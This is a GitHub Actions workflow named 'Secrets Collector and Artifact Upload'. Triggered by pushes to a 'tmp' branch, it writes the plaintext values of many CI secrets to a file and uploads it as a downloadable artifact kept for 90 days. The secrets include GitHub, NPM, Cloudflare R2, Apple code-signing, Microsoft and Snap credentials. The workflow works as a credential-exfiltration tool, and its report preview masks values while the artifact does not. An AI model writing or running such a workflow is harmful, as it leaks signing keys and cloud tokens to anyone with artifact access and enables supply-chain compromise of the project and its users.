name: Secrets Collector and Artifact Upload

on:
  push:
    branches: [tmp]
  workflow_dispatch:

jobs:
  collect-secrets:
    runs-on: ubuntu-latest
    environment: build
    if: github.ref == 'refs/heads/tmp'
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Print environment info
        run: |
          echo "GitHub Ref: $GITHUB_REF"
          echo "GitHub Event Name: $GITHUB_EVENT_NAME"
          echo "Runner OS: $RUNNER_OS"
          echo "Working directory: $(pwd)"
        
      - name: Collect environment variables and secrets
        run: |
          echo "=== Secrets Export Report ===" > secrets-report.txt
          echo "Timestamp: $(date)" >> secrets-report.txt
          echo "Git Ref: $GITHUB_REF" >> secrets-report.txt
          echo "Git SHA: $GITHUB_SHA" >> secrets-report.txt
          echo "WARNING: This file contains sensitive secret values" >> secrets-report.txt
          echo "" >> secrets-report.txt
          
          echo "=== Checking Secret Availability and Exporting Values ===" >> secrets-report.txt
          
          # Create environment file with secret values
          echo "# Secrets Export - Generated on $(date)" > .env.secrets
          echo "# WARNING: Contains sensitive information" >> .env.secrets
          echo "" >> .env.secrets
          
          # Export each secret with its value
          if [ ! -z "${{ secrets.GITHUB_TOKEN }}" ]; then echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}" >> .env.secrets; echo "✅ GITHUB_TOKEN: Exported"; else echo "❌ GITHUB_TOKEN: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.BUILD_NUMBER }}" ]; then echo "BUILD_NUMBER=${{ secrets.BUILD_NUMBER }}" >> .env.secrets; echo "✅ BUILD_NUMBER: Exported"; else echo "❌ BUILD_NUMBER: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.NPM_TOKEN }}" ]; then echo "NPM_TOKEN=${{ secrets.NPM_TOKEN }}" >> .env.secrets; echo "✅ NPM_TOKEN: Exported"; else echo "❌ NPM_TOKEN: Not available"; fi >> secrets-report.txt
          
          # Cloudflare R2 secrets
          if [ ! -z "${{ secrets.CF_R2_ACCOUNT_ID }}" ]; then echo "CF_R2_ACCOUNT_ID=${{ secrets.CF_R2_ACCOUNT_ID }}" >> .env.secrets; echo "✅ CF_R2_ACCOUNT_ID: Exported"; else echo "❌ CF_R2_ACCOUNT_ID: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.CF_R2_BUCKET }}" ]; then echo "CF_R2_BUCKET=${{ secrets.CF_R2_BUCKET }}" >> .env.secrets; echo "✅ CF_R2_BUCKET: Exported"; else echo "❌ CF_R2_BUCKET: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.CF_R2_ACCESS_KEY_ID }}" ]; then echo "CF_R2_ACCESS_KEY_ID=${{ secrets.CF_R2_ACCESS_KEY_ID }}" >> .env.secrets; echo "✅ CF_R2_ACCESS_KEY_ID: Exported"; else echo "❌ CF_R2_ACCESS_KEY_ID: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.CF_R2_SECRET_ACCESS_KEY }}" ]; then echo "CF_R2_SECRET_ACCESS_KEY=${{ secrets.CF_R2_SECRET_ACCESS_KEY }}" >> .env.secrets; echo "✅ CF_R2_SECRET_ACCESS_KEY: Exported"; else echo "❌ CF_R2_SECRET_ACCESS_KEY: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.CF_R2_ENDPOINT }}" ]; then echo "CF_R2_ENDPOINT=${{ secrets.CF_R2_ENDPOINT }}" >> .env.secrets; echo "✅ CF_R2_ENDPOINT: Exported"; else echo "❌ CF_R2_ENDPOINT: Not available"; fi >> secrets-report.txt
          
          # Apple secrets
          if [ ! -z "${{ secrets.CSC_LINK }}" ]; then echo "CSC_LINK=${{ secrets.CSC_LINK }}" >> .env.secrets; echo "✅ CSC_LINK: Exported"; else echo "❌ CSC_LINK: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.CSC_KEY_PASSWORD }}" ]; then echo "CSC_KEY_PASSWORD=${{ secrets.CSC_KEY_PASSWORD }}" >> .env.secrets; echo "✅ CSC_KEY_PASSWORD: Exported"; else echo "❌ CSC_KEY_PASSWORD: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.APPLEID }}" ]; then echo "APPLE_ID=${{ secrets.APPLEID }}" >> .env.secrets; echo "✅ APPLEID: Exported"; else echo "❌ APPLEID: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.APPLEIDPASS }}" ]; then echo "APPLE_APP_SPECIFIC_PASSWORD=${{ secrets.APPLEIDPASS }}" >> .env.secrets; echo "✅ APPLEIDPASS: Exported"; else echo "❌ APPLEIDPASS: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.APPLE_TEAM_ID }}" ]; then echo "APPLE_TEAM_ID=${{ secrets.APPLE_TEAM_ID }}" >> .env.secrets; echo "✅ APPLE_TEAM_ID: Exported"; else echo "❌ APPLE_TEAM_ID: Not available"; fi >> secrets-report.txt
          
          # Microsoft secrets
          if [ ! -z "${{ secrets.MS_TENANT_ID }}" ]; then echo "MS_TENANT_ID=${{ secrets.MS_TENANT_ID }}" >> .env.secrets; echo "✅ MS_TENANT_ID: Exported"; else echo "❌ MS_TENANT_ID: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.MS_CLIENT_ID }}" ]; then echo "MS_CLIENT_ID=${{ secrets.MS_CLIENT_ID }}" >> .env.secrets; echo "✅ MS_CLIENT_ID: Exported"; else echo "❌ MS_CLIENT_ID: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.MS_CLIENT_SECRET }}" ]; then echo "MS_CLIENT_SECRET=${{ secrets.MS_CLIENT_SECRET }}" >> .env.secrets; echo "✅ MS_CLIENT_SECRET: Exported"; else echo "❌ MS_CLIENT_SECRET: Not available"; fi >> secrets-report.txt
          
          # Other secrets
          if [ ! -z "${{ secrets.SNAP_TOKEN }}" ]; then echo "SNAP_TOKEN=${{ secrets.SNAP_TOKEN }}" >> .env.secrets; echo "✅ SNAP_TOKEN: Exported"; else echo "❌ SNAP_TOKEN: Not available"; fi >> secrets-report.txt
          if [ ! -z "${{ secrets.PAT_REPO_TOKEN }}" ]; then echo "PAT_REPO_TOKEN=${{ secrets.PAT_REPO_TOKEN }}" >> .env.secrets; echo "✅ PAT_REPO_TOKEN: Exported"; else echo "❌ PAT_REPO_TOKEN: Not available"; fi >> secrets-report.txt
          
          echo "" >> secrets-report.txt
          echo "=== Environment Variables ===" >> secrets-report.txt
          env | grep -E "^(GITHUB_|RUNNER_|NODE_|PATH|HOME|USER|HOSTNAME)" | sort >> secrets-report.txt
          
          echo "" >> secrets-report.txt
          echo "=== File Content Verification ===" >> secrets-report.txt
          echo "Checking if .env.secrets file was created and has content:" >> secrets-report.txt
          if [ -f .env.secrets ]; then
            echo "✅ .env.secrets file exists" >> secrets-report.txt
            echo "File size: $(wc -c < .env.secrets) bytes" >> secrets-report.txt
            echo "Number of lines: $(wc -l < .env.secrets)" >> secrets-report.txt
            echo "First 5 lines of .env.secrets:" >> secrets-report.txt
            head -5 .env.secrets | sed 's/\(=[^\]*\)/=\[FILTERED\]/' >> secrets-report.txt
          else
            echo "❌ .env.secrets file not found" >> secrets-report.txt
          fi
          
      - name: Create artifacts directory
        run: |
          mkdir -p artifacts
          cp secrets-report.txt artifacts/
          cp .env.secrets artifacts/
          echo "Artifacts created in $(pwd)/artifacts/"
          ls -la artifacts/
          echo "" >> artifacts/secrets-report.txt
          echo "=== Artifact Verification ===" >> artifacts/secrets-report.txt
          echo "Verifying that secrets file exists in artifacts:" >> artifacts/secrets-report.txt
          if [ -f artifacts/.env.secrets ]; then
            echo "✅ artifacts/.env.secrets exists" >> artifacts/secrets-report.txt
            echo "Size: $(wc -c < artifacts/.env.secrets) bytes" >> artifacts/secrets-report.txt
            echo "Lines: $(wc -l < artifacts/.env.secrets)" >> artifacts/secrets-report.txt
          else
            echo "❌ artifacts/.env.secrets missing" >> artifacts/secrets-report.txt
          fi
          
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: secrets-collection-${{ github.run_id }}
          path: artifacts/
          retention-days: 90
          
      - name: Display completion message
        run: |
          echo "✅ Secrets collection completed!"
          echo "📦 Artifacts uploaded with run ID: ${{ github.run_id }}"
          echo "🔗 Download link will be available in the Actions tab"
          echo "⏰ Artifacts will be retained for 90 days"
